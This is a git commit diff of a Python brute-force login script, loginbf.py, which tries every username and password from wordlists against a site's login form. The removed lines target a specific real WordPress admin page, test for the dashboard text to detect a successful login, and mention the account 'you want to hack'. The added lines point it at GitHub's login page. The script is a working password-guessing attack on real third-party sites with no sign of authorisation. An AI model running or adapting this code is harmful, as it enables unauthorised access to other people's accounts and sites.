5bc41dbd24835a9f0fc205c24f940fb29049b832
marzique <marzique@gmail.com>
2019-04-17 17:09:30 +0300

    some changes in loginerBF

--- loginbf.py
+++ loginbf.py
@@ -4,16 +4,12 @@ from loginform import fill_login_form
 
 # The link of the website
 # url = input("\nEnter URL:")
-url = "http://leafus.com.ua/wp-admin"
+url = "https://github.com/login"
 
-# Getting list of potentials password
 passwords = open('passwords.txt').readlines()
-# Getting list of user to test with
 users = open('users.txt').readlines()
 
 print(f"Connecting to: {url}......\n")
-# Put the target email you want to hack
-#user_email = input("\nEnter EMAIL / USERNAME of the account you want to hack:")
 failed_aftertry = 0
 for user in users:
     for password in passwords:
@@ -23,16 +19,22 @@ for user in users:
         fillings = fill_login_form(url, r.text, user.replace('\n', ''), password.replace('\n', ''))
 
         # POST URL
-        post_url = fillings[-2:-1][0]
-        print(f"{user}: {password}")
+        print(f"trying {user}: {password}")
         payload = dict(fillings[:-2][0])
-        with requests.Session() as s:
-            res = requests.get(url)
-            cookies = dict(res.cookies)
-            p = s.post(post_url, data=payload, verify=False, cookies=cookies)
-            if 'Майстерня' in p.text:
-                print('logged in!!')
-            else:
-                print('wrong password')
+        post_url = fillings[-2:-1][0]
+        method = fillings[-1:][0]
+
+        if method == "POST":
+            with requests.Session() as s:
+                res = requests.get(url)
+                cookies = dict(res.cookies)
+                p = s.post(post_url, data=payload, cookies=cookies)
+                print(p.text)
+                # print(p.content)\
+        elif method == "GET":
+            print('get method form')
+        else:
+            print('no method found')
+
 
 Just_to_pause_the_script = input("\n.")
